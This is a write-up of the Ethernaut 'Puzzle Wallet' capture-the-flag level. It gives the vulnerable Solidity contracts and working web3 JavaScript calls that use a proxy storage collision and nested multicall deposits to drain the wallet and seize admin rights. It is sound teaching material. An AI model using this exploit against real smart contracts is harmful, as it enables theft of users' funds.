# Level 24: Puzzle Wallet

This is the level 24 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how) in Solidity
- [Proxy Patterns](https://blog.openzeppelin.com/proxy-patterns/)

## Hack

Given contracts:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
`player` has to hijack the proxy contract, `PuzzleProxy` by becoming `admin`.

The vulnerability here arises due to **storage collision** between the proxy contract (`PuzzleProxy`) and logic contract (`PuzzleWallet`). And storage collision is a nightmare when using `delegatecall`. Let's bring this nightmare to reality.

Note that in proxy pattern any call/transaction sent does not directly go to the logic contract (`PuzzleWallet` here), but it is actually **delegated** to logic contract inside proxy contract (`PuzzleProxy` here) through `delegatecall` method.

Since, `delegatecall` is context preserving, the context is taken from `PuzzleProxy`. Meaning, any state read or write in storage would happen in `PuzzleProxy` at a corresponding slot, instead of `PuzzleWallet`.

Compare the storage variables at slots:
```
slot | PuzzleWallet  -  PuzzleProxy
----------------------------------
 0   |   owner      <-  pendingAdmin
 1   |   maxBalance <-  admin
 2   |           . 
 3   |           .
```
Accordingly, any write to `pendingAdmin` in `PuzzleProxy` would be reflected by `owner` in `PuzzleWallet` because they are at same storage slot, 0!

And that means if we set `pendingAdmin` to `player` in `PuzzleProxy` (through `proposeNewAdmin` method), `player` is automatically `owner` in `PuzzleWallet`! That's exactly what we'll do. Although `contract` instance provided `web3js` API, doesn't expose the `proposeNewAdmin` method, we can alway encode signature of function call and send transaction to the contract:

```javascript
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})
```
`player` is now `owner`. Verify by:
```javascript
await contract.owner() === player

// Output: true
```

Now, since we're `owner` let's whitelist us, `player`:
```javascript
await contract.addToWhitelist(player)
```

Okay, so now `player` can call `onlyWhitelisted` guarded methods.

Also, note from the storage slot table above that `admin` and `maxBalance` also correspond to same slot (slot 1). We can write to `admin` if in some way we can write to `maxBalance` the address of `player`.

Two methods alter `maxBalance` - `init` and `setMaxBalance`. `init` shows no hope as it `require`s current `maxBalance` value to be zero. So, let's focus on `setMaxBalance`. 

`setMaxBalance` can only set new `maxBalance` only if the contract's balance is 0. Check balance:
```javascript
await getBalance(contract.address)

// Output: 0.001
```
Bad luck! It's non-zero. Can we somehow take out the contract's balance? Only method that does so, is `execute`, but contract tracks each user's balance through `balances` such that you can only withdraw what you deposited. We need some way to crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance. 

A possible way is to somehow call `deposit` with same `msg.value` _multiple_ times within the same transaction. Hmmm...the developers of this contract did write logic to batch multiple transactions into one transaction to save gas costs. And this is what `multicall` method is for. Maybe we can exploit it?

But wait! `multicall` actually extracts function selector (which is first 4 bytes from signature) from the data and makes sure that `deposit` is called only once per transaction!
```solidity
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

We need another way. Think deeper...we can only call `deposit` only once in a `multicall`...but what if call a `multicall` that calls multiple `multicall`s and each of these `multicall`s call `deposit` once...aha! That'd be totally valid since each of these multiple `multicall`s will check their own separate `depositCalled` bools.

The contract balance currently is `0.001 eth`. If we're able to call `deposit` two times through two `multicall`s in same transaction. The `balances[player]` would be registered from `0 eth` to `0.002 eth`, but in reality only `0.001 eth` will be actually sent! Hence total balance of contract is in reality `0.002 eth` but accounting in `balances` would think it's `0.003 eth`. Anyway, `player` is now eligible to take out `0.002 eth` from contract and drain it as a result. Let's begin.

Here's our call _inception_ (calls within calls within call!)
```
            multicall
               |
        -----------------
        |               |
     multicall        multicall
        |                 |
      deposit          deposit     
                      
```
Get function call encodings:
```javascript
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
```

Now we call `multicall` which will call two `multicalls` and each of these two will call `deposit` once each. Send value of `0.001 eth` with transaction:
```javascript
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```

`player` balance now must be `0.001 eth * 2` i.e. `0.002 eth`. Which is equal to contract's total balance at this time.

Withdraw same amount by `execute`:
```javascript
await contract.execute(player, toWei('0.002'), 0x0)
```

By now, contract's balance must be zero. Verify:
```javascript
await getBalance(contract.address)

// Output: '0'
```

Finally we can call `setMaxBalance` to set `maxBalance` and as a consequence of storage collision, set admin to `player`:
```javascript
await contract.setMaxBalance(player)
```

Bang! Wallet is hijacked!


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

